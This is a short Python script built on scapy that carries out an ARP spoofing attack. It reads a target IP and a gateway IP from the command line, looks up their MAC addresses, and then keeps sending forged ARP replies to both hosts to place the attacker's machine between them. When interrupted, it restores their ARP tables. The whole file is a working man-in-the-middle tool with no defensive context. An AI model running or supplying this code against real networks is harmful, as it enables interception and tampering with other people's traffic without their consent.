import scapy.all as scapy
import optparse
import time



def parseinput():
    parser=optparse.OptionParser()
    parser.add_option('-t','--target',dest='target',help='target network ip adress')
    parser.add_option('-g','--gateway',dest='gateway',help='gateway network ip adress')
    (options,arguments)=parser.parse_args()
    return options



def find_mac(ip_address):
    arp_request=scapy.ARP(pdst=ip_address)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_arp=broadcast/arp_request
    answer,unanswer=scapy.srp(final_arp,timeout=1,verbose=False)
    return answer[0][1].hwsrc



def spoof(target_ip,gateway_ip):
    
    packet1=scapy.ARP(op=2,pdst=target_ip,hwdst=mac_target,psrc=gateway_ip)
    packet2=scapy.ARP(op=2,pdst=gateway_ip,hwdst=mac_gateway,psrc=target_ip)
    scapy.send(packet1,verbose=False)
    scapy.send(packet2,verbose=False)


def restore(target_ip,gateway_ip):
    
    packet1=scapy.ARP(op=2,pdst=target_ip,hwdst=mac_target,psrc=gateway_ip,hwsrc=mac_gateway)
    packet2=scapy.ARP(op=2,pdst=gateway_ip,hwdst=mac_gateway,psrc=target_ip,hwsrc=mac_target)
    scapy.send(packet1,count=5,verbose=False)
    scapy.send(packet2,count=5,verbose=False)


options=parseinput()
mac_target=find_mac(options.target)
mac_gateway=find_mac(options.gateway)

count=0
try:
    while True:
        spoof(options.target,options.gateway)
        count=count+2
        time.sleep(0.3)
        print(f"\r[+] {count} packets sent",end="")

except KeyboardInterrupt:
    restore(options.target,options.gateway)
    print("\n[+] ARP tables restored")
